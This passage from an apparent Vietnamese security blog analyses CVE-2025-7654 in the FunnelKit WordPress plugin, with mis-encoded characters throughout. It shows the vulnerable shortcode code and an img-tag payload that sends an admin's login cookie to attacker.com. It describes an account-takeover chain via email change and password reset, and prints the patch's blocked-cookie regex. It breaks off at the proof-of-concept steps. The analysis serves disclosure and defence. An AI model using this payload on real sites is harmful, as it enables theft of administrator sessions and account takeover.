&amp;#39;wf_&amp;#39; . $code, array( $this, $code ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V·ªõi c·∫•u h√¨nh n√†y, plugin t·∫°o ra hai shortcode t∆∞∆°ng ·ª©ng v·ªõi hai h√†m callback ƒë·ªÉ x·ª≠ l√Ω:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt; ‚Üí callback &lt;code&gt;get_cookie&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Shortcode &lt;code&gt;wf_get_url_parameter&lt;/code&gt; ‚Üí callback &lt;code&gt;get_url_parameter&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Trong ƒë√≥, shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt; tr·ª±c ti·∫øp li√™n quan ƒë·∫øn l·ªó h·ªïng b·∫£o m·∫≠t.&lt;/p&gt;&#xA;&lt;p&gt;Khi shortcode n√†y ƒë∆∞·ª£c nh√∫ng v√†o b√†i vi·∫øt ho·∫∑c trang, callback &lt;code&gt;get_cookie&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_cookie( $attr ) {&#xA;    $attr = shortcode_atts( array(&#xA;        &amp;#39;key&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;    ), $attr );&#xA;&#xA;    if ( empty( $attr[&amp;#39;key&amp;#39;] ) ) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    $data = isset( $_COOKIE[ $attr[&amp;#39;key&amp;#39;] ] ) ? bwf_clean( $_COOKIE[ $attr[&amp;#39;key&amp;#39;] ] ) : &amp;#39;&amp;#39;;&#xA;&#xA;    /*** read cookie when drop cookie on page **/&#xA;    if ( empty( $data ) ) {&#xA;        $key  = str_replace( &amp;#39;bwf_&amp;#39;, &amp;#39;&amp;#39;, $attr[&amp;#39;key&amp;#39;] );&#xA;        $data = isset( $_GET[ $key ] ) ? bwf_clean( $_GET[ $key ] ) : &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    return $data;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;get_cookie&lt;/code&gt; cho ph√©p ƒë·ªçc tr·ª±c ti·∫øp gi√° tr·ªã cookie t·ª´ bi·∫øn to√†n c·ª•c &lt;code&gt;$_COOKIE&lt;/code&gt; v√† g√°n v√†o bi·∫øn &lt;code&gt;$data&lt;/code&gt;. &lt;strong&gt;N·∫øu &lt;code&gt;$data&lt;/code&gt; kh√¥ng r·ªóng&lt;/strong&gt;, h√†m s·∫Ω b·ªè qua ho√†n to√†n nh√°nh ƒë·ªçc t·ª´ &lt;code&gt;$_GET&lt;/code&gt; v√† &lt;strong&gt;tr·∫£ v·ªÅ tr·ª±c ti·∫øp gi√° tr·ªã cookie ƒë√≥&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;V√≠ d·ª•, khi shortcode sau ƒë∆∞·ª£c nh√∫ng v√†o m·ªôt b√†i vi·∫øt:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[wf_get_cookie key=&amp;#39;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&amp;#39;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi m·ªôt ng∆∞·ªùi d√πng &lt;strong&gt;ƒë√£ ƒëƒÉng nh·∫≠p&lt;/strong&gt; truy c·∫≠p b√†i vi·∫øt n√†y, shortcode s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω ·ªü ph√≠a server v√† gi√° tr·ªã cookie &lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt; c·ªßa &lt;strong&gt;ch√≠nh ng∆∞·ªùi ƒëang xem trang&lt;/strong&gt; s·∫Ω ƒë∆∞·ª£c render th·∫≥ng v√†o n·ªôi dung b√†i vi·∫øt.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie.png&#34; title=&#34;Cookie ƒë∆∞·ª£c hi·ªÉn th·ªã trong post&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/cookie.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;Cookie ƒë∆∞·ª£c hi·ªÉn th·ªã trong post&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie.png&#39; alt=&#34;Cookie&#34; height=&#34;631&#34; width=&#34;1914&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cookie ƒë∆∞·ª£c hi·ªÉn th·ªã trong post&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tho·∫°t nh√¨n, ƒëi·ªÅu n√†y c√≥ v·∫ª ‚Äúv√¥ h·∫°i‚Äù, v√¨ m·ªói ng∆∞·ªùi ch·ªâ th·∫•y cookie c·ªßa &lt;strong&gt;ch√≠nh m√¨nh&lt;/strong&gt;. Tuy nhi√™n, v·∫•n ƒë·ªÅ n·∫±m ·ªü ch·ªó: shortcode kh√¥ng ch·ªâ c√≥ th·ªÉ hi·ªÉn th·ªã vƒÉn b·∫£n, m√† c√≤n c√≥ th·ªÉ ƒë∆∞·ª£c nh√∫ng v√†o &lt;strong&gt;c√°c thu·ªôc t√≠nh HTML&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;K·∫ª t·∫•n c√¥ng v·ªõi quy·ªÅn &lt;strong&gt;Contributor&lt;/strong&gt; c√≥ th·ªÉ ch√®n shortcode v√†o thu·ªôc t√≠nh &lt;code&gt;src&lt;/code&gt; c·ªßa m·ªôt th·∫ª &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&amp;#34;http://attacker.com/[wf_get_cookie key=&amp;#39;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&amp;#39;]&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi &lt;strong&gt;qu·∫£n tr·ªã vi√™n (admin)&lt;/strong&gt; ƒëƒÉng nh·∫≠p v√† m·ªü b√†i vi·∫øt n√†y, shortcode s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω, cookie ƒëƒÉng nh·∫≠p c·ªßa admin s·∫Ω b·ªã ch√®n tr·ª±c ti·∫øp v√†o URL c·ªßa ·∫£nh. Tr√¨nh duy·ªát sau ƒë√≥ s·∫Ω g·ª≠i m·ªôt request t·ªõi server c·ªßa attacker, v√¥ t√¨nh mang theo &lt;strong&gt;cookie x√°c th·ª±c c·ªßa admin&lt;/strong&gt; trong ƒë∆∞·ªùng d·∫´n.&lt;/p&gt;&#xA;&lt;p&gt;üëâ Ch√≠nh t·∫°i th·ªùi ƒëi·ªÉm n√†y, cookie kh√¥ng c√≤n ‚Äúch·ªâ hi·ªÉn th·ªã cho ng∆∞·ªùi xem‚Äù n·ªØa, m√† ƒë√£ b·ªã &lt;strong&gt;r√≤ r·ªâ ra b√™n ngo√†i&lt;/strong&gt;, m·ªü ƒë∆∞·ªùng cho vi·ªác chi·∫øm quy·ªÅn ƒëƒÉng nh·∫≠p v√† leo thang ƒë·∫∑c quy·ªÅn.&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhi√™n, ta c·∫ßn ph·∫£i n·∫Øm ƒë∆∞·ª£c cookie n√†o nguy hi·ªÉm ƒë·ªÉ khai th√°c.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie_new.png&#34; title=&#34;Cookie ƒë∆∞·ª£c set khi login th√†nh c√¥ng&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/cookie_new.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;Cookie ƒë∆∞·ª£c set khi login th√†nh c√¥ng&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie_new.png&#39; alt=&#34;Cookie&#34; height=&#34;797&#34; width=&#34;1914&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cookie ƒë∆∞·ª£c set khi login th√†nh c√¥ng&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p th√†nh c√¥ng v√†o WordPress, h·ªá th·ªëng s·∫Ω thi·∫øt l·∫≠p hai cookie x√°c th·ª±c ch√≠nh:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_86a9106ae65537651a8e456835b316ab&lt;/code&gt;: √°p d·ª•ng cho c√°c ƒë∆∞·ªùng d·∫´n &lt;code&gt;/wp-content/plugins&lt;/code&gt; v√† &lt;code&gt;/wp-admin&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt;: √°p d·ª•ng cho ƒë∆∞·ªùng d·∫´n &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Trong ƒë√≥, chu·ªói &lt;code&gt;86a9106ae65537651a8e456835b316ab&lt;/code&gt; l√† &lt;strong&gt;gi√° tr·ªã hash ƒë∆∞·ª£c t·∫°o t·ª´ URL c·ªßa website&lt;/strong&gt;, c·ª• th·ªÉ l√† &lt;code&gt;md5(&#39;http://localhost&#39;)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Theo chu·∫©n &lt;a href=&#34;https://datatracker.ietf.org/doc/html/rfc6265#section-5.2.4&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;RFC 6265&lt;/a&gt;, m·ª•c &lt;strong&gt;5.2.4 ‚Äì Path Attribute&lt;/strong&gt;, chu·∫©n n√†y quy ƒë·ªãnh c√°ch tr√¨nh duy·ªát x·ª≠ l√Ω thu·ªôc t√≠nh &lt;code&gt;Path&lt;/code&gt; c·ªßa cookie:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/path.png&#34; title=&#34;Path theo chu·∫©n RFC 6265&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/path.png&#34; data-sub-html=&#34;&lt;h2&gt;Path&lt;/h2&gt;&lt;p&gt;Path theo chu·∫©n RFC 6265&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/path.png&#39; alt=&#34;Path&#34; height=&#34;354&#34; width=&#34;757&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Path theo chu·∫©n RFC 6265&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Thu·ªôc t√≠nh &lt;code&gt;Path&lt;/code&gt; x√°c ƒë·ªãnh &lt;strong&gt;ph·∫°m vi ƒë∆∞·ªùng d·∫´n (URL path)&lt;/strong&gt; m√† cookie s·∫Ω ƒë∆∞·ª£c g·ª≠i k√®m trong c√°c request HTTP.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Nh·∫≠n di·ªán thu·ªôc t√≠nh &lt;code&gt;Path&lt;/code&gt;&lt;/strong&gt;: N·∫øu t√™n thu·ªôc t√≠nh (kh√¥ng ph√¢n bi·ªát ch·ªØ hoa/th∆∞·ªùng) l√† &lt;code&gt;Path&lt;/code&gt;, tr√¨nh duy·ªát ph·∫£i x·ª≠ l√Ω cookie theo c√°c quy t·∫Øc b√™n d∆∞·ªõi.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Tr∆∞·ªùng h·ª£p &lt;code&gt;Path&lt;/code&gt; r·ªóng ho·∫∑c kh√¥ng h·ª£p l·ªá&lt;/strong&gt; (kh√¥ng b·∫Øt ƒë·∫ßu b·∫±ng k√Ω t·ª± &lt;code&gt;/&lt;/code&gt;):&#xA;Tr√¨nh duy·ªát s·∫Ω g√°n &lt;code&gt;cookie-path&lt;/code&gt; b·∫±ng &lt;strong&gt;default-path&lt;/strong&gt;, t·ª©c l√† ƒë∆∞·ªùng d·∫´n m·∫∑c ƒë·ªãnh ƒë∆∞·ª£c suy ra t·ª´ URL ƒë√£ t·∫°o cookie.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/default.png&#34; title=&#34;default-path theo chu·∫©n RFC 6265&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/default.png&#34; data-sub-html=&#34;&lt;h2&gt;Default&lt;/h2&gt;&lt;p&gt;default-path theo chu·∫©n RFC 6265&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/default.png&#39; alt=&#34;Default&#34; height=&#34;860&#34; width=&#34;771&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;default-path theo chu·∫©n RFC 6265&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Theo m·ª•c &lt;strong&gt;5.1.4 ‚Äì Paths and Path-Match&lt;/strong&gt; c·ªßa &lt;a href=&#34;https://datatracker.ietf.org/doc/html/rfc6265#section-5.1.4&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;RFC 6265&lt;/a&gt;, &lt;code&gt;default-path&lt;/code&gt; ƒë∆∞·ª£c t√≠nh nh∆∞ sau:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;uri-path&lt;/code&gt;: L·∫•y ph·∫ßn &lt;strong&gt;path&lt;/strong&gt; c·ªßa &lt;code&gt;request-uri&lt;/code&gt; (kh√¥ng bao g·ªìm query string).&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu &lt;code&gt;uri-path&lt;/code&gt; r·ªóng ho·∫∑c kh√¥ng b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;default-path&lt;/code&gt; l√† &lt;code&gt;/&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu &lt;code&gt;uri-path&lt;/code&gt; ch·ªâ ch·ª©a m·ªôt d·∫•u &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;default-path&lt;/code&gt; l√† &lt;code&gt;/&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Trong c√°c tr∆∞·ªùng h·ª£p c√≤n l·∫°i, &lt;code&gt;default-path&lt;/code&gt; l√† ph·∫ßn ƒë∆∞·ªùng d·∫´n t·ª´ ƒë·∫ßu &lt;code&gt;uri-path&lt;/code&gt; ƒë·∫øn tr∆∞·ªõc d·∫•u &lt;code&gt;/&lt;/code&gt; ngo√†i c√πng b√™n ph·∫£i.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Tr∆∞·ªùng h·ª£p &lt;code&gt;Path&lt;/code&gt; h·ª£p l·ªá&lt;/strong&gt; (b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;/&lt;/code&gt;):&#xA;Tr√¨nh duy·ªát s·∫Ω s·ª≠ d·ª•ng tr·ª±c ti·∫øp gi√° tr·ªã &lt;code&gt;Path&lt;/code&gt; n√†y l√†m ph·∫°m vi √°p d·ª•ng c·ªßa cookie.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Sau khi x√°c ƒë·ªãnh &lt;code&gt;cookie-path&lt;/code&gt;, tr√¨nh duy·ªát s·∫Ω l∆∞u cookie k√®m theo thu·ªôc t√≠nh &lt;code&gt;Path&lt;/code&gt; t∆∞∆°ng ·ª©ng v√† ch·ªâ g·ª≠i cookie n√†y trong c√°c request c√≥ URL path ph√π h·ª£p.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;K·ªãch b·∫£n t·∫•n c√¥ng c·ªßa l·ªó h·ªïng n√†y c√≥ th·ªÉ x·∫£y ra trong hai tr∆∞·ªùng h·ª£p:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Qu·∫£n tr·ªã vi√™n truy c·∫≠p b√†i vi·∫øt &lt;strong&gt;ch∆∞a ƒë∆∞·ª£c publish&lt;/strong&gt; th√¥ng qua endpoint &lt;code&gt;/?p=354&amp;amp;preview=true&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Qu·∫£n tr·ªã vi√™n truy c·∫≠p b√†i vi·∫øt &lt;strong&gt;ƒë√£ ƒë∆∞·ª£c publish&lt;/strong&gt; th√¥ng qua endpoint &lt;code&gt;/ten-post&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Trong c·∫£ hai tr∆∞·ªùng h·ª£p tr√™n, &lt;strong&gt;ch·ªâ cookie &lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt; ƒë∆∞·ª£c g·ª≠i k√®m theo request&lt;/strong&gt;, do cookie n√†y ƒë∆∞·ª£c thi·∫øt l·∫≠p v·ªõi &lt;code&gt;Path=/&lt;/code&gt; v√† √°p d·ª•ng cho to√†n b·ªô website.&lt;/p&gt;&#xA;&lt;p&gt;V√¨ v·∫≠y ta kh√¥ng c√≥ gi√° tr·ªã c·ªßa cookie &lt;code&gt;wordpress_86a9106ae65537651a8e456835b316ab&lt;/code&gt; ƒë·ªÉ truy c·∫≠p trang qu·∫£n tr·ªã (&lt;code&gt;/wp-admin&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhi√™n ta v·∫´n c√≥ th·ªÉ t·∫•n c√¥ng theo c√°ch kh√°c b·∫±ng cookie &lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt; ƒë·ªÉ truy c·∫≠p &lt;code&gt;/wp-admin&lt;/code&gt; :)))&lt;/p&gt;&#xA;&lt;p&gt;Khi setup &lt;strong&gt;FunnelKit&lt;/strong&gt; c√πng &lt;strong&gt;WooCommerce&lt;/strong&gt;, endpoint &lt;code&gt;/my-account/edit-account/&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng l√†m trang frontend cho ph√©p &lt;strong&gt;ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p&lt;/strong&gt; ch·ªânh s·ª≠a th√¥ng tin t√†i kho·∫£n, v√† t·∫°i ƒë√¢y cookie &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; lu√¥n ƒë∆∞·ª£c g·ª≠i k√®m theo request do ƒë∆∞·ª£c thi·∫øt l·∫≠p v·ªõi &lt;code&gt;Path=/&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/edit.png&#34; title=&#34;Edit profile&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/edit.png&#34; data-sub-html=&#34;&lt;h2&gt;Path&lt;/h2&gt;&lt;p&gt;Edit profile&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/edit.png&#39; alt=&#34;Path&#34; height=&#34;1076&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Edit profile&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒêi·ªÉm ƒë√°ng ch√∫ √Ω l√† khi thay ƒë·ªïi email t√†i kho·∫£n, h·ªá th·ªëng &lt;strong&gt;kh√¥ng y√™u c·∫ßu nh·∫≠p l·∫°i m·∫≠t kh·∫©u hay x√°c th·ª±c b·ªï sung&lt;/strong&gt;. ƒêi·ªÅu n√†y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ &lt;strong&gt;thay ƒë·ªïi email c·ªßa t√†i kho·∫£n admin sang email do attacker ki·ªÉm so√°t&lt;/strong&gt;. Sau ƒë√≥, attacker ch·ªâ c·∫ßn s·ª≠ d·ª•ng ch·ª©c nƒÉng &lt;strong&gt;forgot password&lt;/strong&gt; ƒë·ªÉ ƒë·∫∑t m·∫≠t kh·∫©u m·ªõi v√† ƒëƒÉng nh·∫≠p v·ªõi quy·ªÅn qu·∫£n tr·ªã vi√™n.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;B·∫£n v√° trong &lt;strong&gt;v3.12.0&lt;/strong&gt; ƒë√£ kh·∫Øc ph·ª•c l·ªó h·ªïng b·∫±ng c√°ch &lt;strong&gt;gi·ªõi h·∫°n c√°c cookie nh·∫°y c·∫£m kh√¥ng cho ph√©p truy c·∫≠p th√¥ng qua shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;C·ª• th·ªÉ, plugin b·ªï sung m·ªôt danh s√°ch c√°c m·∫´u cookie b·ªã ch·∫∑n th√¥ng qua bi·∫øn:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public $restricted_cookie_pattern = &amp;#34;/^(wordpress_.*|_fk_contact_uid|wp-settings-.*|PHPSESSID|wordpress_logged_in_.*|wp_woocommerce_session_.*)$/&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong h√†m &lt;code&gt;get_cookie&lt;/code&gt;, tr∆∞·ªõc khi ƒë·ªçc d·ªØ li·ªáu t·ª´ &lt;code&gt;$_COOKIE&lt;/code&gt;, plugin th·ª±c hi·ªán ki·ªÉm tra:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (preg_match($this-&amp;gt;restricted_cookie_pattern, $attr[&amp;#39;key&amp;#39;])) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† n·∫øu key c·ªßa cookie kh·ªõp v·ªõi c√°c pattern nh·∫°y c·∫£m nh∆∞:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_logged_in_*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp-settings-*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;PHPSESSID&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_woocommerce_session_*&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;th√¨ h√†m s·∫Ω &lt;strong&gt;tr·∫£ v·ªÅ r·ªóng&lt;/strong&gt; v√† &lt;strong&gt;kh√¥ng cho ph√©p ƒë·ªçc gi√° tr·ªã cookie&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Nh·ªù ƒë√≥, shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt; kh√¥ng c√≤n kh·∫£ nƒÉng truy xu·∫•t cookie x√°c th·ª±c c·ªßa WordPress ho·∫∑c WooCommerce, qua ƒë√≥ &lt;strong&gt;ngƒÉn ch·∫∑n ho√†n to√†n k·ªãch b·∫£n r√≤ r·ªâ cookie v√† privilege escalation&lt;/strong&gt; ƒë√£ ƒë∆∞·ª£c khai th√°c ·ªü c√°c phi√™n b·∫£n tr∆∞·ªõc.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Contributor)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Create / Edit Post&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Insert shortcode wf_get_cookie into HTML attribute (img src)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Post saved (draft or published)&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Admin visits post (preview or published URL)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;WordPress processes shortcode server-side&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;wf_get_cookie reads wordpress_logged_in_* from $_COOKIE&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Cookie value rendered into HTML output&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Browser loads external resource (attacker.com)&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Admin authentication cookie leaked via URL&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Attacker captures wordpress_logged_in_* cookie&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Attacker sets stolen cookie in browser&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;Access /my-account/edit-account/ as Admin&amp;#34;]&#xA;M --&amp;gt; N[&amp;#34;Change admin email without re-authentication&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;Trigger forgot password flow&amp;#34;]&#xA;O --&amp;gt; P[&amp;#34;Reset password via attacker-controlled email&amp;#34;]&#xA;&#xA;P --&amp;gt; Q[&amp;#34;Full admin account takeover&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;ƒêƒÉng nh·∫≠p b·∫±ng t√†i 